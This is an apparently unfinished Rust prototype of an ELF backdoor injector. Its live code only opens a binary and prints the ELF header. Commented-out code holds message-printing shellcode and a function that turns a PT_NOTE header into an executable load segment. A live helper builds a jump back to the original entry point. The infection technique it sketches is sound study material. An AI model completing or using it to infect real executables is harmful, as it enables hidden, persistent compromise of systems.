use std::fs::{self, File};

use byteorder::{ByteOrder, LittleEndian};

use mental_elf;
use mental_elf::utils::Result;

struct Backdoor {
    shellcode: Vec<u8>,
    file_offset: u64,
    virtual_offset: u64,
}

fn main() -> Result<()> {
    let mut fd = open_file("example_elf")?;

    // let fsize = fd.metadata()?.len();
    // let shellcode: Vec<u8> = vec![
    //     // Note to self: generated with `xxd -i shellcode.o`
    //     0xeb, 0x17, 0x48, 0x31, 0xc0, 0x48, 0x31, 0xdb, 0xfe, 0xc0, 0x48, 0x89,
    //     0xf8, 0x5e, 0xb3, 0x19, 0x0f, 0x05, 0xb0, 0x3c, 0x48, 0x31, 0xff, 0x0f,
    //     0x05, 0xe8, 0xe4, 0xff, 0xff, 0xff, 0x64, 0x6f, 0x6e, 0x74, 0x20, 0x74,
    //     0x65, 0x6c, 0x6c, 0x20, 0x61, 0x6e, 0x79, 0x6f, 0x6e, 0x65, 0x20, 0x69,
    //     0x6d, 0x20, 0x68, 0x65, 0x72, 0x65, 0x0a, 0x00
    // ];

    // let mut backdoor = Backdoor {
    //     shellcode,
    //     file_offset: fsize,
    //     virtual_offset: 0xc000000 + fsize,
    // };

    // patch_jump(&mut backdoor.shellcode, 0x0123456789abcdef);

    let mut elf_header = mental_elf::elf_header::from_fd(&mut fd)?;
    // let mut program_headers = mental_elf::program_header::from_fd(fd)?;

    // patch_note(&mut program_headers, &backdoor);
    println!("{:?}", elf_header);

    Ok(())
}

fn open_file(path: &str) -> Result<File> {
    let fd = fs::OpenOptions::new().read(true).write(true).open(&path)?;
    Ok(fd)
}

// fn patch_note(
//     program_headers: Vec<ProgramHeader>, backdoor: Backdoor) -> Result<()> 
// {
//     for header in program_headers {
//         if header.p_type == PT_NOTE {
//             header.p_type = PT_LOAD;
//             header.p_flags = PF_R | PF_X;
//             header.p_offset = backdoor.file_offset;
//             header.p_vaddr = backdoor.virtual_offset;
//             header.p_filesz = backdoor.shellcode.len();
//             header.p_memsz = backdoor.shellcode.len();
//             return Ok(())
//         }    
//     }

//     Err(())
// }

fn patch_jump(shellcode: &mut Vec<u8>, entry_point: u64) {
    let mut jmp_code = [ 
        0x48u8, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax
        0xff, 0xe0
    ];

    LittleEndian::write_u64(&mut jmp_code[2..], entry_point);

    println!("{:#x?}", jmp_code);
    shellcode.extend_from_slice(&jmp_code);
}